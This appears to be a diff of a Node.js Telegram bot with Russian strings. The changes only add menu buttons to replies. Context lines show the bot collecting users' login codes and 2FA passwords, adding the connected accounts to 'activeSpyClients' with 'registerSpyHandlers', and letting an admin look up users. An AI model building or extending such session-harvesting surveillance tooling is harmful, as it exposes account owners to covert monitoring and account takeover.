@@ -260,7 +260,7 @@ bot.on('message', async (msg) => {
 
         db.get(`SELECT * FROM promo_codes WHERE code = ?`, [inputCode], (err, promo) => {
             if (err || !promo) {
-                return bot.sendMessage(chatId, "❌ *Такого промокода не существует.* Проверь буквы и введи заново:");
+                return bot.sendMessage(chatId, "❌ *Такого промокода не существует.* Проверь буквы и введи заново:", { reply_markup: getMenuButtons(chatId) });
             }
 
             if (promo.current_uses >= promo.max_uses) {
@@ -317,7 +317,7 @@ bot.on('message', async (msg) => {
             activeSpyClients.push(state.client);
             await registerSpyHandlers(state.client, `Узел (@${me.username})`);
             delete authStates[chatId];
-            return bot.sendMessage(chatId, `🎉 *Аккаунт успешно подключен!*`);
+            return bot.sendMessage(chatId, `🎉 *Аккаунт успешно подключен!*`, { reply_markup: getMenuButtons(chatId) }); // Добавили кнопки сюда
         } catch (err) {
             if (err.message.includes("SESSION_PASSWORD_NEEDED")) {
                 authStates[chatId].step = 'WAITING_PASSWORD';
@@ -335,22 +335,27 @@ bot.on('message', async (msg) => {
             activeSpyClients.push(state.client);
             await registerSpyHandlers(state.client, `Узел (@${me.username})`);
             delete authStates[chatId];
-            return bot.sendMessage(chatId, `🎉 *Аккаунт с 2FA успешно подключен!*`);
+            return bot.sendMessage(chatId, `🎉 *Аккаунт с 2FA успешно подключен!*`, { reply_markup: getMenuButtons(chatId) }); // Добавили кнопки сюда
         } catch (err) { return bot.sendMessage(chatId, `❌ Пароль неверный.`); }
     }
 
-    // Роутинг поиска
+    // ==========================================
+    // 🔥 РОУТИНГ ПОИСКА (ГЛАВНОЕ ИЗМЕНЕНИЕ)
+    // ==========================================
     if (chatId.toString() === ADMIN_ID) {
         let param = text; let isUsername = false;
         if (msg.forward_from) param = msg.forward_from.id.toString();
         else if (text.startsWith('@')) isUsername = true;
-        else if (!/^\d+$/.test(text)) return bot.sendMessage(chatId, "⚠️ Админ, вбивай `@username` юзера или ID.");
+        else if (!/^\d+$/.test(text)) return bot.sendMessage(chatId, "⚠️ Админ, вбивай `@username` юзера или ID.", { reply_markup: getMenuButtons(chatId) }); // Кнопки при ошибке
+
         searchUser(param, isUsername, (res) => {
-            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } });
+            // Вместо одиночной кнопки "Назад" выдаем полное меню getMenuButtons
+            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
         });
     } else {
         searchChatInDb(text, (res) => {
-            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В меню', callback_data: 'to_main' }]] } });
+            // Вместо одиночной кнопки "Назад" выдаем полное меню getMenuButtons
+            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
         });
     }
 });
